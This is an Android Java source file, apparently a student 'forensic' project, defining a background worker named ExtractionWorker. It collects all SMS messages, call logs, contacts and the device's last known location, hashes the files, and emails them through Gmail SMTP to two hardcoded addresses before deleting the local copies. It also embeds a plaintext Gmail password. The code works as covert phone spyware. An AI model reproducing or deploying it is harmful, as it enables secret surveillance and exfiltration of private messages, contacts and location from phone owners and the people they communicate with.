package mx.ipn.escuela.pruebaproyectofinalforense;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Properties;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class ExtractionWorker extends Worker {

    private static final String LOG_TAG = "ExtractionWorker";
    private final Context context;

    public ExtractionWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.d(LOG_TAG, "Extraction work starting.");

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(LOG_TAG, "Location permission is not granted. Worker cannot run.");
            return Result.failure();
        }

        final CountDownLatch latch = new CountDownLatch(1);
        final Result[] workerResult = {Result.failure()}; // Default to failure

        try {
            FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
            Log.d(LOG_TAG, "Requesting last known location...");

            fusedLocationClient.getLastLocation().addOnCompleteListener(locationTask -> {
                new Thread(() -> {
                    try {
                        Location location = null;
                        if (locationTask.isSuccessful() && locationTask.getResult() != null) {
                            location = locationTask.getResult();
                            Log.d(LOG_TAG, "Location obtained successfully.");
                        } else {
                            Log.w(LOG_TAG, "Could not get location. Proceeding without it.", locationTask.getException());
                        }

                        performExtractionAndSending(location);
                        workerResult[0] = Result.success();
                    } catch (Exception e) {
                        Log.e(LOG_TAG, "An error occurred in the background thread.", e);
                    } finally {
                        latch.countDown(); // Signal completion regardless of success or failure
                    }
                }).start();
            });

            Log.d(LOG_TAG, "Waiting for extraction process to complete...");
            boolean finishedInTime = latch.await(2, TimeUnit.MINUTES);

            if (!finishedInTime) {
                Log.e(LOG_TAG, "Worker timed out after 2 minutes.");
                return Result.failure();
            }
            Log.d(LOG_TAG, "Worker process finished with result: " + (workerResult[0] == Result.success() ? "SUCCESS" : "FAILURE"));
            return workerResult[0];

        } catch (Exception e) {
            Log.e(LOG_TAG, "An unexpected error occurred in doWork.", e);
            return Result.failure();
        }
    }


    private void performExtractionAndSending(Location location) {
        File forensicDir = new File(context.getCacheDir(), "forensic_cache");
        List<File> generatedFiles = new ArrayList<>();
        try {
            if (!forensicDir.exists()) {
                forensicDir.mkdirs();
            }

            Log.d(LOG_TAG, "Starting data extraction...");

            generatedFiles.add(extractSms(forensicDir));
            generatedFiles.add(extractCallLogs(forensicDir));
            generatedFiles.add(extractContacts(forensicDir));

            List<File> validFiles = new ArrayList<>();
            for (File f : generatedFiles) {
                if (f != null && f.exists()) {
                    validFiles.add(f);
                }
            }

            File hashFile = generateIntegrityFile(forensicDir, validFiles);
            if (hashFile != null) {
                validFiles.add(hashFile);
            }

            Log.d(LOG_TAG, "Data extraction complete. Starting email process...");
            sendEmailWithAttachments(validFiles, location);
        } catch (Exception e) {
            Log.e(LOG_TAG, "Error during extraction and sending process.", e);
        } finally {
            Log.d(LOG_TAG, "Cleaning up temporary files.");
            for (File file : generatedFiles) {
                if (file != null && file.exists()) {
                    file.delete();
                }
            }
            if (forensicDir.exists()) {
                File hashFile = new File(forensicDir, "hashes.txt");
                if (hashFile.exists()) {
                    hashFile.delete();
                }
                forensicDir.delete();
            }
        }
    }

    private File extractSms(File directory) {
        Log.d(LOG_TAG, "Extracting SMS...");
        StringBuilder csvData = new StringBuilder("Address,Body,Date\n");
        try (Cursor cursor = context.getContentResolver().query(Telephony.Sms.CONTENT_URI, new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE}, null, null, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)).replace("\n", " ").replace("\"", "'");
                    long dateMillis = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(dateMillis));
                    csvData.append(String.format("\"%s\",\"%s\",\"%s\"\n", address, body, date));
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            Log.e(LOG_TAG, "Error extracting SMS", e);
        }
        return writeToFile(new File(directory, "sms.csv"), csvData.toString());
    }

    private File extractCallLogs(File directory) {
        Log.d(LOG_TAG, "Extracting Call Logs...");
        StringBuilder csvData = new StringBuilder("Number,Type,Duration,Date\n");
        try (Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE}, null, null, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    long dateMillis = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(dateMillis));
                    String callType;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE: callType = "Incoming"; break;
                        case CallLog.Calls.OUTGOING_TYPE: callType = "Outgoing"; break;
                        case CallLog.Calls.MISSED_TYPE: callType = "Missed"; break;
                        default: callType = "Unknown"; break;
                    }
                    csvData.append(String.format("\"%s\",\"%s\",\"%s\",\"%s\"\n", number, callType, duration, date));
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            Log.e(LOG_TAG, "Error extracting Call Logs", e);
        }
        return writeToFile(new File(directory, "calllog.csv"), csvData.toString());
    }

    private File extractContacts(File directory) {
        Log.d(LOG_TAG, "Extracting Contacts...");
        StringBuilder csvData = new StringBuilder("Name,Number\n");
        try (Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)).replace("\"", "'");
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    csvData.append(String.format("\"%s\",\"%s\"\n", name, number));
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            Log.e(LOG_TAG, "Error extracting Contacts", e);
        }
        return writeToFile(new File(directory, "contacts.csv"), csvData.toString());
    }

    private File generateIntegrityFile(File directory, List<File> files) {
        Log.d(LOG_TAG, "Generating integrity file...");
        StringBuilder hashData = new StringBuilder();
        for (File file : files) {
            if (file != null && file.exists()) {
                try {
                    String hash = calculateFileHash(file);
                    hashData.append(String.format("%s: %s\n", file.getName(), hash));
                } catch (Exception e) {
                    Log.e(LOG_TAG, "Could not calculate hash for " + file.getName(), e);
                }
            }
        }
        return writeToFile(new File(directory, "hashes.txt"), hashData.toString());
    }

    private String calculateFileHash(File file) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        try (InputStream fis = new FileInputStream(file)) {
            byte[] byteArray = new byte[1024];
            int bytesCount;
            while ((bytesCount = fis.read(byteArray)) != -1) {
                digest.update(byteArray, 0, bytesCount);
            }
        }
        byte[] bytes = digest.digest();
        StringBuilder sb = new StringBuilder();
        for (byte aByte : bytes) {
            sb.append(String.format("%02x", aByte));
        }
        return sb.toString();
    }

    private File writeToFile(File file, String data) {
        try (FileWriter writer = new FileWriter(file)) {
            writer.append(data);
            Log.d(LOG_TAG, "Successfully wrote to temp file: " + file.getName());
        } catch (IOException e) {
            Log.e(LOG_TAG, "Error writing to file " + file.getName(), e);
            return null;
        }
        return file;
    }

    private void sendEmailWithAttachments(List<File> files, Location location) throws MessagingException, IOException {
        if (files.isEmpty()) {
            Log.w(LOG_TAG, "No files were generated, skipping email.");
            return;
        }
        Log.d(LOG_TAG, "Preparing to send email with " + files.size() + " attachments.");
        final String username = "josebryanomar2004@gmail.com";
        final String password = "nqrvpuiigtdfgtzn";

        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        Session session = Session.getInstance(props, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress(username));
        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("josebryanomar2004@gmail.com,dilanmcuevas@gmail.com"));
        message.setSubject("Forensic Data Extraction Report");

        MimeBodyPart textBodyPart = new MimeBodyPart();
        StringBuilder bodyText = new StringBuilder("Forensic data files are attached.\n\n");
        if (location != null) {
            bodyText.append("Device Location:\n");
            bodyText.append("Latitude: ").append(location.getLatitude()).append("\n");
            bodyText.append("Longitude: ").append(location.getLongitude()).append("\n");
            bodyText.append("Google Maps: ").append("https://www.google.com/maps/search/?api=1&query=").append(location.getLatitude()).append(",").append(location.getLongitude());
        } else {
            bodyText.append("Device location could not be determined.");
        }
        textBodyPart.setText(bodyText.toString());

        MimeMultipart multipart = new MimeMultipart();
        multipart.addBodyPart(textBodyPart);

        for (File file : files) {
            MimeBodyPart attachmentBodyPart = new MimeBodyPart();
            attachmentBodyPart.attachFile(file);
            multipart.addBodyPart(attachmentBodyPart);
        }

        message.setContent(multipart);
        Transport.send(message);
        Log.i(LOG_TAG, "Email sent successfully.");
    }
}
